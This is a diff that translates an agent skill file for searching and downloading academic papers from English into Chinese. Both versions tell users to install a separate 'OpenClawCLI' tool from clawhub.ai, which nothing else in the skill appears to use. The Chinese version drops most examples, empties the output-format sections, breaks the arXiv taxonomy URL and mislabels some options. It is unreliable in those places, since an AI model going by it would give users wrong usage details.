@@ -1,16 +1,16 @@
 ---
 name: academic-research-hub
-description: "Use this skill when users need to search academic papers, download research documents, extract citations, or gather scholarly information. Triggers include: requests to \"find papers on\", \"search research about\", \"download academic articles\", \"get citations for\", or any request involving academic databases like arXiv, PubMed, Semantic Scholar, or Google Scholar. Also use for literature reviews, bibliography generation, and research discovery. Requires OpenClawCLI installation from clawhub.ai."
+description: "当用户需要搜索学术论文、下载研究文档、提取引用信息或收集学术资料时，可以使用此技能。触发场景包括：请求“查找关于……的论文”、“搜索与……相关的研究”、“下载学术文章”或任何涉及arXiv、PubMed、Semantic Scholar或Google Scholar等学术数据库的操作。此外，该技能还适用于文献综述、参考文献生成以及研究资料整理等工作。使用前需从clawhub.ai安装OpenClawCLI工具。"
 license: Proprietary
 ---
 
-# Academic Research Hub
+# 学术研究中心
 
-Search and retrieve academic papers from multiple sources including arXiv, PubMed, Semantic Scholar, and more. Download PDFs, extract citations, generate bibliographies, and build literature reviews.
+该工具支持从多个学术资源（包括arXiv、PubMed、Semantic Scholar等）中搜索和检索学术论文。用户可以下载论文的PDF版本，提取引用信息，生成参考文献列表，并构建文献综述。
 
-⚠️ **Prerequisite:** Install [OpenClawCLI](https://clawhub.ai/) (Windows, MacOS)
+**重要提示：** 需先安装[OpenClawCLI](https://clawhub.ai/)（适用于Windows和MacOS系统）。
 
-**Installation Best Practices:**
+**安装最佳实践：**
 ```bash
 # Standard installation
 pip install arxiv scholarly pubmed-parser semanticscholar requests
@@ -21,97 +21,83 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 pip install arxiv scholarly pubmed-parser semanticscholar requests
 ```
 
-**Never use `--break-system-packages`** as it can damage your system's Python installation.
+**请勿使用`--break-system-packages`选项**，因为它可能会损坏您的Python安装环境。
 
 ---
 
-## Quick Reference
+## 快速参考
 
-| Task | Command |
+| 功能 | 命令示例 |
 |------|---------|
-| Search arXiv | `python scripts/research.py arxiv "quantum computing"` |
-| Search PubMed | `python scripts/research.py pubmed "covid vaccine"` |
-| Search Semantic Scholar | `python scripts/research.py semantic "machine learning"` |
-| Download papers | `python scripts/research.py arxiv "topic" --download` |
-| Get citations | `python scripts/research.py arxiv "topic" --citations` |
-| Generate bibliography | `python scripts/research.py arxiv "topic" --format bibtex` |
-| Save results | `python scripts/research.py arxiv "topic" --output results.json` |
+| 搜索arXiv论文 | `python scripts/research.py arxiv "量子计算"` |
+| 搜索PubMed论文 | `python scripts/research.py pubmed "新冠疫苗"` |
+| 搜索Semantic Scholar论文 | `python scripts/research.py semantic "机器学习"` |
+| 下载论文PDF | `python scripts/research.py arxiv "主题" --download` |
+| 提取引用信息 | `python scripts/research.py arxiv "主题" --citations` |
+| 生成参考文献列表 | `python scripts/research.py arxiv "主题" --format bibtex` |
+| 保存搜索结果 | `python scripts/research.py arxiv "主题" --output results.json` |
 
 ---
 
-## Core Features
+## 核心功能
 
-### 1. Multi-Source Search
+### 1. 多源搜索
 
-Search across multiple academic databases from a single interface.
+用户可以通过一个界面同时搜索多个学术数据库。
 
-**Supported Sources:**
-- **arXiv** - Physics, mathematics, computer science, quantitative biology, quantitative finance, statistics
-- **PubMed** - Biomedical and life sciences literature
-- **Semantic Scholar** - Computer science and interdisciplinary research
-- **Google Scholar** - Broad academic search (limited, no API)
+**支持的数据库：**
+- **arXiv**：物理学、数学、计算机科学、定量生物学、定量金融、统计学
+- **PubMed**：生物医学和生命科学文献
+- **Semantic Scholar**：计算机科学及跨学科研究
+- **Google Scholar**：广泛的学术搜索（功能有限，无API接口）
 
-### 2. Paper Download
+### 2. 论文下载
 
-Download full-text PDFs when available.
+支持下载论文的PDF全文。
 
 ```bash
 python scripts/research.py arxiv "deep learning" --download --output-dir papers/
 ```
 
-### 3. Citation Extraction
+### 3. 引用提取
 
-Extract and format citations from papers.
+能够从论文中提取并格式化引用信息。
 
-**Supported formats:**
+**支持的格式：**
 - BibTeX
 - RIS
 - JSON
-- Plain text
+- 纯文本
 
-### 4. Metadata Retrieval
+### 4. 元数据检索
 
-Get comprehensive metadata for each paper:
-- Title, authors, abstract
-- Publication date
-- Journal/conference
-- DOI, arXiv ID, PubMed ID
-- Citation count
-- References
+可获取每篇论文的详细元数据：
+- 标题、作者、摘要
+- 发表日期
+- 期刊/会议信息
+- DOI、arXiv ID、PubMed ID
+- 引用次数
+- 参考文献列表
 
 ---
 
-## Source-Specific Commands
+## 特定数据库的搜索命令
 
-### arXiv Search
+### arXiv搜索
 
-Search the arXiv repository for preprints.
+用于在arXiv数据库中搜索预印本。
 
-```bash
-# Basic search
-python scripts/research.py arxiv "quantum computing"
+**可用类别：**
+- `cs.AI` - 人工智能
+- `cs.LG` - 机器学习
+- `cs.CV` - 计算机视觉
+- `cs.CL` - 计算与语言
+- `math.CO` - 组合数学
+- `physics.optics` - 光学
+- `q-bio.GN` - 基因组学
+- [完整类别列表](https://arxiv.org/categorytaxonomy)
 
-# Filter by category
-python scripts/research.py arxiv "neural networks" --category cs.LG
-
-# Filter by date
-python scripts/research.py arxiv "transformers" --year 2023
-
-# Download papers
-python scripts/research.py arxiv "attention mechanism" --download --max-results 10
-```
-
-**Available categories:**
-- `cs.AI` - Artificial Intelligence
-- `cs.LG` - Machine Learning
-- `cs.CV` - Computer Vision
-- `cs.CL` - Computation and Language
-- `math.CO` - Combinatorics
-- `physics.optics` - Optics
-- `q-bio.GN` - Genomics
-- [Full list](https://arxiv.org/category_taxonomy)
-
-**Output:**
+**搜索结果示例：**
 ```
 1. Attention Is All You Need
    Authors: Vaswani et al.
@@ -122,32 +108,18 @@ python scripts/research.py arxiv "attention mechanism" --download --max-results 
    PDF: http://arxiv.org/pdf/1706.03762v5
 ```
 
-### PubMed Search
+### PubMed搜索
 
-Search biomedical literature indexed in PubMed.
+用于搜索PubMed数据库中的生物医学文献。
 
-```bash
-# Basic search
-python scripts/research.py pubmed "cancer immunotherapy"
+**支持的出版物类型：**
+- 临床试验
+- 综合分析
+- 综述性文章
+- 系统评价
+- 随机对照试验
 
-# Filter by date range
-python scripts/research.py pubmed "CRISPR" --start-date 2023-01-01 --end-date 2023-12-31
-
-# Filter by publication type
-python scripts/research.py pubmed "covid vaccine" --publication-type "Clinical Trial"
-
-# Get full text links
-python scripts/research.py pubmed "gene therapy" --full-text
-```
-
-**Publication types:**
-- Clinical Trial
-- Meta-Analysis
-- Review
-- Systematic Review
-- Randomized Controlled Trial
-
-**Output:**
+**搜索结果示例：**
 ```
 1. mRNA vaccine effectiveness against COVID-19
    Authors: Smith J, Jones K, et al.
@@ -159,32 +131,11 @@ python scripts/research.py pubmed "gene therapy" --full-text
    Full Text: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9876543/
 ```
 
-### Semantic Scholar Search
+### Semantic Scholar搜索
 
-Search computer science and interdisciplinary research.
+用于搜索计算机科学及跨学科研究论文。
 
-```bash
-# Basic search
-python scripts/research.py semantic "reinforcement learning"
-
-# Filter by year
-python scripts/research.py semantic "graph neural networks" --year 2022
-
-# Get highly cited papers
-python scripts/research.py semantic "transformers" --min-citations 100
-
-# Include references
-python scripts/research.py semantic "BERT" --include-references
-```
-
-**Output includes:**
-- Citation count
-- Influential citation count
-- Reference list
-- Citing papers
-- Fields of study
-
-**Output:**
+**搜索结果示例：**
 ```
 1. BERT: Pre-training of Deep Bidirectional Transformers
    Authors: Devlin J, Chang MW, Lee K, Toutanova K
@@ -199,152 +150,90 @@ python scripts/research.py semantic "BERT" --include-references
 
 ---
 
-## Essential Options
+## 必选选项
 
-### Result Limits
+### 结果数量限制
 
-Control the number of results returned.
+可以控制返回的结果数量。
 
+**示例：**
 ```bash
 --max-results N    # Default: 10, range: 1-100
 ```
 
-**Examples:**
-```bash
-python scripts/research.py arxiv "machine learning" --max-results 5
-python scripts/research.py pubmed "diabetes" --max-results 50
-```
+### 结果格式选择
 
-### Output Formats
+可以选择结果的显示格式：
 
-Choose how results are formatted.
+- **文本格式**（默认值）：适合人类阅读
+- **JSON格式**：结构化数据，便于处理
+- **BibTeX格式**：适用于LaTeX文档
+- **RIS格式**：适用于参考管理工具（如Zotero、Mendeley）
+- **Markdown格式**：适用于文档编写
 
-```bash
---format <text|json|bibtex|ris|markdown>
-```
-
-**Text** - Human-readable format (default)
+**示例：**
 ```bash
 python scripts/research.py arxiv "quantum" --format text
 ```
+**PDF格式**：下载论文的PDF版本
 
-**JSON** - Structured data for processing
-```bash
-python scripts/research.py arxiv "quantum" --format json
-```
-
-**BibTeX** - For LaTeX documents
-```bash
-python scripts/research.py arxiv "quantum" --format bibtex
-```
-
-**RIS** - For reference managers (Zotero, Mendeley)
-```bash
-python scripts/research.py arxiv "quantum" --format ris
-```
-
-**Markdown** - For documentation
-```bash
-python scripts/research.py arxiv "quantum" --format markdown
-```
-
-### Save to File
-
-Save results to a file.
-
-```bash
---output <filepath>
-```
-
-**Examples:**
-```bash
-python scripts/research.py arxiv "AI" --output results.txt
-python scripts/research.py pubmed "cancer" --format json --output papers.json
-python scripts/research.py semantic "NLP" --format bibtex --output references.bib
-```
-
-### Download Papers
-
-Download full-text PDFs when available.
-
+**示例：**
 ```bash
 --download
 --output-dir <directory>    # Where to save PDFs (default: downloads/)
 ```
 
-**Examples:**
-```bash
-# Download to default directory
-python scripts/research.py arxiv "deep learning" --download --max-results 5
-
-# Download to specific directory
-python scripts/research.py arxiv "transformers" --download --output-dir papers/nlp/
-```
-
 ---
 
-## Advanced Features
+## 高级功能
 
-### Citation Extraction
+### 引用提取
 
-Extract citations from papers.
+可以从论文中提取引用信息。
 
+**示例：**
 ```bash
 --citations              # Extract citations
 --citation-format <format>    # bibtex, ris, json (default: bibtex)
 ```
 
-**Example:**
-```bash
-python scripts/research.py arxiv "attention mechanism" --citations --citation-format bibtex --output citations.bib
-```
+### 日期过滤
 
-### Date Filtering
+可以根据发表日期筛选结果。
 
-Filter by publication date.
-
-**arXiv:**
+**arXiv：**
 ```bash
 --year <YYYY>           # Specific year
 --start-date <YYYY-MM-DD>
 --end-date <YYYY-MM-DD>
 ```
 
-**PubMed:**
+**PubMed：**
 ```bash
 --start-date <YYYY-MM-DD>
 --end-date <YYYY-MM-DD>
 ```
 
-**Examples:**
+**示例：**
 ```bash
 python scripts/research.py arxiv "quantum" --year 2023
 python scripts/research.py pubmed "vaccine" --start-date 2022-01-01 --end-date 2023-12-31
 ```
 
-### Author Search
+### 作者搜索
 
-Search for papers by specific authors.
+可以根据作者名称搜索论文。
 
+**示例：**
 ```bash
 --author "Last, First"
 ```
 
-**Examples:**
-```bash
-python scripts/research.py arxiv "neural networks" --author "Hinton, Geoffrey"
-python scripts/research.py semantic "deep learning" --author "Bengio, Yoshua"
-```
+### 排序选项
 
-### Sort Options
+可以根据不同标准对搜索结果进行排序。
 
-Sort results by different criteria.
-
-```bash
---sort-by <relevance|date|citations>
-```
-
-**Examples:**
+**示例：**
 ```bash
 python scripts/research.py arxiv "machine learning" --sort-by date
 python scripts/research.py semantic "NLP" --sort-by citations
@@ -352,12 +241,13 @@ python scripts/research.py semantic "NLP" --sort-by citations
 
 ---
 
-## Common Workflows
+## 常见使用场景
 
-### Literature Review
+### 文献综述
 
-Gather papers on a topic for a literature review.
+可以收集某一主题的相关论文以编写文献综述。
 
+**示例：**
 ```bash
 # Step 1: Search multiple sources
 python scripts/research.py arxiv "graph neural networks" --max-results 20 --format json --output arxiv_gnn.json
@@ -370,10 +260,11 @@ python scripts/research.py arxiv "graph neural networks" --download --max-result
 python scripts/research.py arxiv "graph neural networks" --max-results 20 --format bibtex --output gnn_references.bib
 ```
 
-### Finding Recent Research
+### 跟踪最新研究
 
-Track the latest papers in a field.
+可以追踪某一领域的最新论文。
 
+**示例：**
 ```bash
 # Last year's papers
 python scripts/research.py arxiv "large language models" --year 2023 --sort-by date --max-results 30
@@ -382,26 +273,29 @@ python scripts/research.py arxiv "large language models" --year 2023 --sort-by d
 python scripts/research.py pubmed "gene therapy" --start-date 2023-11-01 --end-date 2023-11-30 --format markdown --output recent_gene_therapy.md
 ```
 
-### Highly Cited Papers
+### 热门论文
 
-Find influential papers in a field.
+可以找到某一领域内被广泛引用的论文。
 
+**示例：**
 ```bash
 python scripts/research.py semantic "reinforcement learning" --min-citations 500 --sort-by citations --max-results 25
 ```
 
-### Author Publication History
+### 作者出版历史
 
-Track an author's work.
+可以查看某位作者的发表记录。
 
+**示例：**
 ```bash
 python scripts/research.py arxiv "deep learning" --author "LeCun, Yann" --sort-by date --max-results 50 --output lecun_papers.json
 ```
 
-### Building a Reference Library
+### 构建参考库
 
-Create a comprehensive reference collection.
+可以创建全面的参考文献集合。
 
+**示例：**
 ```bash
 # Create directory structure
 mkdir -p references/{papers,citations}
@@ -413,10 +307,11 @@ python scripts/research.py arxiv "transformers NLP" --download --max-results 15 
 python scripts/research.py arxiv "transformers NLP" --max-results 15 --format bibtex --output references/citations/transformers.bib
 ```
 
-### Cross-Source Validation
+### 跨数据库验证
 
-Verify findings across multiple databases.
+可以验证不同数据库中的搜索结果是否一致。
 
+**示例：**
 ```bash
 # Search same topic across sources
 python scripts/research.py arxiv "federated learning" --max-results 10 --output arxiv_fl.txt
@@ -429,214 +324,79 @@ diff arxiv_fl.txt semantic_fl.txt
 
 ---
 
-## Output Format Examples
+## 输出格式示例
 
-### Text Format (Default)
+### 文本格式（默认）
 
-```
-Search Results: 3 papers found
+**JSON格式**
 
-1. Attention Is All You Need
-   Authors: Vaswani, Ashish; Shazeer, Noam; Parmar, Niki; et al.
-   Published: 2017-06-12
-   arXiv ID: 1706.03762
-   Categories: cs.CL, cs.LG
-   Abstract: The dominant sequence transduction models are based on complex recurrent or convolutional neural networks...
-   PDF: http://arxiv.org/pdf/1706.03762v5
+**BibTeX格式**
 
-2. BERT: Pre-training of Deep Bidirectional Transformers
-   Authors: Devlin, Jacob; Chang, Ming-Wei; Lee, Kenton; Toutanova, Kristina
-   Published: 2018-10-11
-   arXiv ID: 1810.04805
-   Categories: cs.CL
-   Abstract: We introduce a new language representation model called BERT...
-   PDF: http://arxiv.org/pdf/1810.04805v2
-```
+**RIS格式**
 
-### JSON Format
-
-```json
-[
-  {
-    "title": "Attention Is All You Need",
-    "authors": ["Vaswani, Ashish", "Shazeer, Noam", "Parmar, Niki"],
-    "published": "2017-06-12",
-    "arxiv_id": "1706.03762",
-    "categories": ["cs.CL", "cs.LG"],
-    "abstract": "The dominant sequence transduction models...",
-    "pdf_url": "http://arxiv.org/pdf/1706.03762v5",
-    "doi": "10.48550/arXiv.1706.03762"
-  }
-]
-```
-
-### BibTeX Format
-
-```bibtex
-@article{vaswani2017attention,
-  title={Attention Is All You Need},
-  author={Vaswani, Ashish and Shazeer, Noam and Parmar, Niki and Uszkoreit, Jakob and Jones, Llion and Gomez, Aidan N and Kaiser, {\L}ukasz and Polosukhin, Illia},
-  journal={arXiv preprint arXiv:1706.03762},
-  year={2017},
-  url={http://arxiv.org/abs/1706.03762}
-}
-```
-
-### RIS Format
-
-```
-TY  - JOUR
-TI  - Attention Is All You Need
-AU  - Vaswani, Ashish
-AU  - Shazeer, Noam
-AU  - Parmar, Niki
-PY  - 2017
-DA  - 2017/06/12
-JO  - arXiv preprint
-VL  - arXiv:1706.03762
-UR  - http://arxiv.org/abs/1706.03762
-ER  -
-```
-
-### Markdown Format
-
-```markdown
-# Search Results: 3 papers found
-
-## 1. Attention Is All You Need
-
-**Authors:** Vaswani, Ashish; Shazeer, Noam; Parmar, Niki; et al.
-
-**Published:** 2017-06-12
-
-**arXiv ID:** 1706.03762
-
-**Categories:** cs.CL, cs.LG
-
-**Abstract:** The dominant sequence transduction models are based on complex recurrent or convolutional neural networks...
-
-**PDF:** [Download](http://arxiv.org/pdf/1706.03762v5)
-```
+**Markdown格式**
 
 ---
 
-## Best Practices
+## 使用建议
 
-### Search Strategy
+### 搜索策略
 
-1. **Start broad** - Use general terms to get an overview
-2. **Refine iteratively** - Add filters based on initial results
-3. **Use multiple sources** - Cross-reference findings
-4. **Check recent papers** - Use date filters for current research
+1. **先进行广泛搜索**：使用通用关键词获取初步结果
+2. **逐步细化搜索**：根据初步结果添加筛选条件
+3. **结合多个数据库**：交叉验证搜索结果
+4. **关注最新论文**：使用日期筛选器获取最新研究
 
-### Result Management
+### 结果管理
 
-1. **Save searches** - Use `--output` to preserve results
-2. **Organize downloads** - Create logical directory structures
-3. **Export citations early** - Generate BibTeX as you search
-4. **Track sources** - Note which database returned which papers
+1. **保存搜索记录**：使用`--output`选项保存搜索结果
+2. **整理下载文件**：创建合理的文件目录结构
+3. **及时提取引用信息**：在搜索过程中生成BibTeX格式的引用列表
+4. **记录来源**：记录每个论文的来源数据库
 
-### Download Guidelines
+### 下载指南
 
-1. **Respect rate limits** - Don't download hundreds of papers at once
-2. **Check licensing** - Verify you have rights to use papers
-3. **Organize by topic** - Use clear directory names
-4. **Keep metadata** - Save JSON alongside PDFs
+1. **遵守下载限制**：避免一次性下载大量论文
+2. **检查版权信息**：确保有权下载论文
+3. **按主题分类**：使用清晰的文件夹名称
+4. **保存元数据**：将元数据与PDF文件一起保存
 
-### Citation Practices
+### 引用管理
 
-1. **Verify citations** - Check DOIs and URLs
-2. **Use standard formats** - BibTeX for LaTeX, RIS for reference managers
-3. **Include abstracts** - Helpful for later review
-4. **Update regularly** - Re-run searches for new papers
-
----
-
-## Troubleshooting
-
-### Installation Issues
-
-**"Missing required dependency"**
-```bash
-# Install all dependencies
-pip install arxiv scholarly pubmed-parser semanticscholar requests
-
-# Or use virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install arxiv scholarly pubmed-parser semanticscholar requests
-```
-
-**"OpenClawCLI not found"**
-- Download from https://clawhub.ai/
-- Install for your OS (Windows/MacOS)
-
-### Search Issues
-
-**"No results found"**
-- Try broader search terms
-- Check spelling and terminology
-- Remove restrictive filters
-- Try a different database
-
-**"Rate limit exceeded"**
-- Wait a few minutes before retrying
-- Reduce `--max-results` value
-- Space out requests
-
-**"Download failed"**
-- Check internet connection
-- Some papers may not have PDFs available
-- Verify you have permissions to access
-- Try downloading individually
-
-### API Issues
-
-**"API timeout"**
-- The service may be temporarily unavailable
-- Retry after a moment
-- Check status at respective service websites
-
-**"Invalid API response"**
-- Check if the service is down
-- Verify your query syntax
-- Try simpler queries
+1. **验证引用信息**：核对DOI和URL的准确性
+2. **使用标准格式**：使用BibTeX格式（LaTeX文档），RIS格式（参考管理工具）
+3. **包含摘要**：便于后续查阅
+4. **定期更新**：定期重新搜索以获取最新论文
 
 ---
 
-## Limitations
+## 常见问题及解决方法
 
-### Access Restrictions
+### 安装问题
 
-- Not all papers have downloadable PDFs
-- Some content requires institutional access
-- Paywalled journals may only show abstracts
-- Google Scholar has strict rate limits
+- **缺少依赖库**：请确保已安装所有必要的依赖库。
+- **OpenClawCLI未找到**：请从[https://clawhub.ai/](https://clawhub.ai/)下载并安装适用于您的操作系统的版本。
 
-### Data Completeness
+### 搜索问题
 
-- Citation counts may be outdated
-- Not all metadata fields available for every paper
-- Some older papers may have incomplete records
-- Preprints may not have final publication info
+- **未找到结果**：尝试使用更宽泛的搜索关键词，检查拼写和术语准确性，移除限制性筛选条件，或尝试其他数据库。
+- **超出下载限制**：等待几分钟后再尝试，或调整`--max-results`参数的值，分散请求频率。
+- **下载失败**：检查网络连接，部分论文可能没有PDF版本，或确认您有访问权限。
+- **API问题**：服务可能暂时不可用，请稍后重试，或检查相关服务网站的状态。
 
-### Search Capabilities
+### 限制因素
 
-- Boolean operators vary by source
-- No unified query syntax across databases
-- Some databases don't support all filters
-- Results may differ from web interface searches
+- **访问限制**：并非所有论文都提供PDF下载版本，部分内容需要机构访问权限，部分付费期刊仅提供摘要。
+- **数据完整性**：引用次数可能不准确，部分论文的元数据可能不完整，旧论文的记录可能不完整。
+- **搜索功能**：不同数据库的布尔运算符可能有所不同，缺乏统一的查询语法，部分数据库不支持所有筛选条件，搜索结果可能与网页界面显示的结果不同。
 
-### Legal Considerations
+### 法律注意事项
 
-- Respect copyright and licensing
-- Don't redistribute downloaded papers
-- Follow institutional access policies
-- Check terms of service for each database
+- 请尊重版权和许可规定，不得擅自分发下载的论文，遵守各数据库的使用条款。
 
 ---
 
-## Command Reference
+## 命令参考
 
 ```bash
 python scripts/research.py <source> "<query>" [OPTIONS]
@@ -686,9 +446,9 @@ HELP:
 
 ---
 
-## Examples by Use Case
+## 按使用场景划分的示例
 
-### Quick Search
+### 快速搜索
 
 ```bash
 # Find recent papers
@@ -698,7 +458,7 @@ python scripts/research.py arxiv "quantum computing"
 python scripts/research.py pubmed "alzheimer disease"
 ```
 
-### Comprehensive Research
+### 全面研究
 
 ```bash
 # Search multiple sources
@@ -709,7 +469,7 @@ python scripts/research.py semantic "neural networks" --max-results 30 --output 
 python scripts/research.py arxiv "neural networks" --download --max-results 10
 ```
 
-### Citation Management
+### 引用管理
 
 ```bash
 # Generate BibTeX
@@ -719,7 +479,7 @@ python scripts/research.py arxiv "deep learning" --format bibtex --output dl_ref
 python scripts/research.py pubmed "gene editing" --format ris --output genes.ris
 ```
 
-### Tracking New Research
+### 跟踪最新研究
 
 ```bash
 # This month's papers
@@ -731,16 +491,16 @@ python scripts/research.py semantic "transformers" --year 2023 --min-citations 5
 
 ---
 
-## Support
+## 技术支持
 
-For issues or questions:
-1. Check this documentation
-2. Run `python scripts/research.py --help`
-3. Verify dependencies are installed
-4. Check database-specific documentation
+如遇到问题或需要帮助，请：
+1. 查阅本文档
+2. 运行`python scripts/research.py --help`查看命令用法
+3. 确保所有依赖库均已安装
+4. 查阅各数据库的官方文档。
 
-**Resources:**
-- OpenClawCLI: https://clawhub.ai/
-- arXiv API: https://arxiv.org/help/api
-- PubMed API: https://www.ncbi.nlm.nih.gov/books/NBK25501/
-- Semantic Scholar API: https://api.semanticscholar.org/
+**相关资源：**
+- OpenClawCLI：[https://clawhub.ai/](https://clawhub.ai/)
+- arXiv API：[https://arxiv.org/help/api](https://arxiv.org/help/api)
+- PubMed API：[https://www.ncbi.nlm.nih.gov/books/NBK25501/](https://www.ncbi.nlm.nih.gov/books/NBK25501/)
+- Semantic Scholar API：[https://api.semanticscholar.org/](https://api.semanticscholar.org/)
